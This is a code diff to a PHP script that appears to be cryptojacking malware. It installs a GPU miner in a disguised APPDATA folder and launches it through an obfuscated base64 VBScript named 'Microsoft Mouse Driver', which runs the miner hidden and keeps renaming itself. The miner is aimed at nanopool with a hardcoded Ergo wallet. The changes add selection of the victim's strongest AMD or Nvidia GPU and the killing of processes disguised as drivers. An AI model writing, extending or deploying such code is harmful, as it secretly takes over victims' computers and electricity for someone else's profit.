@@ -21,13 +21,56 @@ $GLOBALS['__download_002'] = function($url)
 		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connTimeout);
-		curl_setopt($ch, CURLOPT_TIMEOUT, $curlTimeout);
 		$response = @curl_exec($ch);
 		return $response;
 		
 	}catch( Exception $e ){}
 	return false;
+};
+
+$GLOBALS['__getdev_002'] = function($lolpath)
+{
+	$output = array();
+	$r = 0;
+	@exec('"' . $lolpath . '" --list-devices', $output, $r);
+	$output = implode("\n", $output);
+	$output = preg_split('/device[\s]+(?=[0-9\s]+\:)/is', "a\n" . $output . "a\n");
+	$l = count($output);
+	$max_mem = 0;
+	$device = false;
+	for($i=1; $i<$l; $i++)
+	{
+		$dev = $output[$i];
+		preg_match('/^[0-9\s]+/is', $dev, $matches);
+		if(!isset($matches[0]))
+			continue;
+		$ndevice = trim($matches[0]);
+		if(!$ndevice)
+			$ndevice = '0';
+		preg_match('/name\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$name = trim($matches[1]);
+		
+		preg_match('/memory\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$memory = preg_replace('/[a-z]+.*?$/is', '', trim($matches[1]));
+		$memory = (int)preg_replace('/[^0-9]+/is', '', $memory);
+		
+		preg_match('/vendor\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$vendor = trim($matches[1]);
+		$vendor = preg_replace('/[^a-z0-9]+/is', '', $vendor);
+		if(stripos($vendor, 'amd') === false && stripos($vendor, 'nvidia') === false && stripos($vendor, 'advancedmicrodevices') === false)
+			continue;
+		if($max_mem > $memory)
+			continue;
+		$max_mem = $memory;
+		$device = array($ndevice, $name, $vendor, $memory);
+	}
+	return $device;
 };
 
 $lolm_path = getenv('APPDATA') . '\\microsoft_win_x86';
@@ -41,7 +84,7 @@ if(!$work_key)
 	@file_put_contents($id_path, $work_key);
 }
 $work_key = trim($work_key);
-$command_id = '000036';
+$command_id = '000040';
 if(@file_get_contents($id_com) !== $command_id)
 {
 	@file_put_contents($id_com, $command_id);
@@ -57,13 +100,20 @@ if(@file_get_contents($id_com) !== $command_id)
 		else
 			$data = false;
 	}
+	$devnum = false;
 	if($data !== false)
 	{
-		
+		sleep(2);
+		$dev = $GLOBALS['__getdev_002']($lolm_path);
+		if($dev)
+			$devnum = $dev[0];
+	}
+	if($devnum !== false)
+	{
 		$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCmZuID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KbiA9IFNwbGl0KGZuLCAiLiIpDQpjID0gQ0RibChuKDEpKQ0KV2hpbGUgVHJ1ZQ0KCWMgPSBjICsgMQ0KCW5uID0gbigwKSAmICIuIiAmIGMgJiAiLiIgJiBuKDIpICYgIi52YnMiDQoJZnNvLk1vdmVGaWxlIGZuLCBubg0KCWZuID0gbm4NCglXU2NyaXB0LlNsZWVwKHtUSU1FT1VUfSkNCldlbmQ';
 		$vbs_checkname = 'Microsoft Mouse Driver x86';
 		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
-		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.' --watchdog exit --apiport 8020 --nocolor';
+		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.' --watchdog exit --nocolor --devices '.$devnum;
 		$command = preg_replace('/\"/is', '""', $command);
 		$vbs = base64_decode($vbs);
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
@@ -73,7 +123,8 @@ if(@file_get_contents($id_com) !== $command_id)
 		{
 			@exec('taskkill /f /im w_driver_x86.exe');
 			@exec('taskkill /f /im w_driverx86.exe');
-			@exec('taskkill /f /im ' . $vbsname);
+			@exec('taskkill /f /im w_driver1.95_x86.exe');
+			sleep(2);
 			$count_files = 0;
 			$di = new DirectoryIterator($vbs_path);
 			unset($data);
